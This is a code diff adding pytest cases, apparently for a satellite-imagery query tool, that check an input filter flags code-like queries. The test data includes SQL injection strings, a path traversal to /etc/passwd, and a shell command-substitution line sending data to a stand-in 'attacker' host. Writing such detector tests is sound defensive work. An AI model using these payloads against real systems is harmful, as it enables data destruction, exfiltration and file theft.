@@ -214,3 +214,20 @@ class TestLiveCheckTwo:
         from satquery.tools.change_mask import _area_text
         assert _area_text(0.007) == "about 7,000 m2"
         assert _area_text(2.345) == "2.35 km2"
+
+
+class TestCodeShapedQueries:
+    @pytest.mark.parametrize("query", [
+        "SELECT * FROM images; DROP TABLE users;", "'; DROP TABLE runs; --",
+        "$(curl http://attacker/exfil)", "../../../../etc/passwd", "' OR '1'='1",
+    ])
+    def test_code_like(self, query):
+        from satquery.controller.understanding import is_code_like
+        assert is_code_like(query)
+
+    @pytest.mark.parametrize("query", [
+        "select the buildings in the north", "update me on what changed", "where is the road?",
+    ])
+    def test_not_code_like(self, query):
+        from satquery.controller.understanding import is_code_like
+        assert not is_code_like(query)
